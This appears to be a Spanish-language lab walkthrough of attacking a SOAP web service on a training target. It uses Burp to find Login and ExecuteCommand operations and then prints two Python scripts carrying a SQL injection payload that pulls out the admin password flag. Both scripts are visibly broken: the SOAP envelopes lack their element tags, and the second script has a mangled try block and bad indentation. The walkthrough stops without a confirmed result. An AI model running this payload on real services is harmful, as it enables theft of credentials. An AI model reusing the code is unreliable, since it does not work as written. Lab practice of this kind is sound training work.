---
description: 'Target(s): 10.129.202.133'
---

# Web Service & API Attacks

Nuestro cliente nos encarga evaluar un servicio web SOAP cuyo archivo WSDL se encuentra en http://\<TARGET IP>:3002/wsdl?wsdl.

Evalúe el objetivo, identifique una vulnerabilidad de inyección SQL a través de mensajes SOAP y responda a la pregunta siguiente.

**Pregunta 1**: Envíe la contraseña del usuario cuyo nombre de usuario es «admin». Formato de la respuesta: FLAG{string}. Tenga en cuenta que el servicio solo responderá correctamente después de enviar el payload SQLi adecuado; de lo contrario, se bloqueará o generará un error.

1. Entramos por el navegador a la URL que nos indica el enunciado:

<figure><img src="../../../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

2. Lo interceptamos en el Proxy de Burp > Click derecho en el response > Extensions > Wsdler (hay que instalarla antes) y veremos que se indentifican 2 operaciones: Login y ExecuteCommand.

<figure><img src="../../../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

3. Enviamos la request de Login al Repeater.

<figure><img src="../../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

4. Cambiamos los valores de username y password a admin:admin y lo enviamos desde el Repeater.

<figure><img src="../../../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

5. Nos entra en conflicto con el SOAPAction, no lo detecta cómo debería. Así que lo combinamos con un script que se muestra en el módulo:

```
username = "admin' OR password LIKE 'FLAG%' -- "
password = "irrelevant"
payload = f'''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">soap:Body{username}{password}</soap:Body></soap:Envelope>'''
response = requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'})
print(response.content)
```

• Pero tampoco parece dar resultado.\
6\. Cómo última opción, utilizando IA y diferentes tutoriales, creamos y ejecutamos el siguiente script:

```
import requests
url = "http://10.129.202.133:3002/wsdl"
username = "admin"
password = "admin"

print("Starting the request...")
payload = f'''
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:tns="http://tempuri.org/"
    xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">soap:Body{username}' OR password LIKE 'FLAG%' -- {password}
    </soap:Body>
</soap:Envelope>

'''try:
response = requests.post(
    url,
    data=payload,
    headers={"SOAPAction": '"Login"'},
    timeout=5
)
print("Request Sent")
print(response.status_code)
print(response.text)

except requests.exceptions.Timeout:
    print("The request timed out.")
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
```

<figure><img src="../../../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>
